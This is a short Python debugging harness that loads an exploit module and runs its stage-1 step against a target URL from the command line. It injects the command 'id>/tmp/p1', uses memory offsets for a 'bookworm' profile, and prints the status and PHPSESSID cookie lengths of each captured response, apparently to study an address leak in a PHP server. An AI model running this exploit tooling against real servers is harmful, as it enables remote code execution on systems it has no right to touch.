#!/usr/bin/env python3
"""Capture the raw stage-1 A/B responses for the display_errors gate.

No parsing shortcuts: prints HTTP status, wire Set-Cookie length and decoded
length for every response of the stage-1 pair.
"""
import importlib.util, re, sys, urllib.parse

spec = importlib.util.spec_from_file_location(
    "e", "/tmp/opencode/research/9bie_aslr_20261022T095015Z/repo/exploit.py")
E = importlib.util.module_from_spec(spec)
spec.loader.exec_module(E)

base = sys.argv[1]
zif = int(sys.argv[2], 0)
dtor = int(sys.argv[3], 0)
t = E.Target(base, verbose=True)
ex = E.Exploit(t, "id>/tmp/p1", zif_offset=zif, dtor_offset=dtor,
               htdata_offset=E.BOOKWORM_HTDATA_OFFSET, profile="bookworm")
ex.rotate()

resps = []
orig = t.post
def cap(*a, **k):
    r = orig(*a, **k)
    resps.append(r)
    return r
t.post = cap
value = ex.stage1()
print("STAGE1_RET", hex(value) if value else "0x0")
for i, r in enumerate(resps, 1):
    head = r.split(b"\r\n\r\n", 1)[0]
    st = re.match(rb"HTTP/1\.[01] (\d+)", head)
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?)(?:; path=/)?\r\n", r)
    wire = m.group(1).decode("latin1") if m else ""
    dec = urllib.parse.unquote_to_bytes(wire)
    print(f"RESP{i} status={st.group(1).decode() if st else '?'} "
          f"wire_cookie_len={len(wire)} decoded_cookie_len={len(dec)} "
          f"head_len={len(head)} total_len={len(r)}")
